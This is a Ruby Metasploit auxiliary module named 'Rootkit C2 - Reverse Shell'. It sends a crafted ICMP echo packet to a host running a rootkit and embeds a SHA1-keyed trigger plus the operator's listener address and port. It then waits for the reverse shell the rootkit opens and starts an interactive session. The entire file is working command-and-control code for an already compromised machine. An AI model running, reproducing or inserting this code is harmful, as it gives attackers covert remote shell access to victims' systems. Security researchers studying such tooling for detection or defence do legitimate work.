##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture
  include Msf::Auxiliary::CommandShell

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Rootkit C2 - Reverse Shell',
      'Description'   => %q{Pops a reverse shell from a given rootkit instance},
      'License'       => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell'],
      'Author'        => ['Anthony Miller-Rhodes']
    ))
    register_options(
      [
        OptString.new('LHOST', [ true, "The IP address of the system to send the shell to" ]),
        OptInt.new('LPORT', [true,'The port to listen for a shell', 5555]),
        OptString.new('RHOST', [ true, "The IP address of the system running this module" ]),
      ], self.class)

    deregister_options('FILTER','PCAPFILE','SNAPLEN')
  end

  def run
    open_pcap

    pcap = self.capture

    @lhost = IPAddr.new datastore['LHOST']
    @rhost = IPAddr.new datastore['RHOST']
    @lport = datastore['LPORT']

    listen_thread = Thread.new do
      print_status("Starting Listener on #{@lhost}:#{@lport}")
      socket = Rex::Socket::TcpServer.create({'LocalHost'=>@lhost.to_s, 'LocalPort'=>@lport})
      rsock = socket.accept()
      start_session(self, "Rootkit Shell", {}, false, rsock)
    end

    capture_sendto(icmp_packet, @rhost.to_s)

    close_pcap

    listen_thread.join
  end

  def icmp_payload
    cmd = [0].pack('N')
    shell_port = [@lport].pack('N')
    hash_data =  "#{@lhost.hton}#{shell_port}#{@rhost.hton}"
    hash = Digest::SHA1.hexdigest hash_data
    "#{[hash].pack('H*')}#{cmd}#{@lhost.hton}#{shell_port}"
  end

  def icmp_packet
    print_status("Crafting payload")
    icmp = PacketFu::ICMPPacket.new
    icmp.ip_src = @lhost.hton
    icmp.ip_dst = @rhost.hton
    icmp.icmp_type = 8
    icmp.payload = capture_icmp_echo_pack(1, 1, icmp_payload << Rex::Text.rand_text(26))
    icmp.recalc
    print_status("Sending payload")
    icmp
  end

end
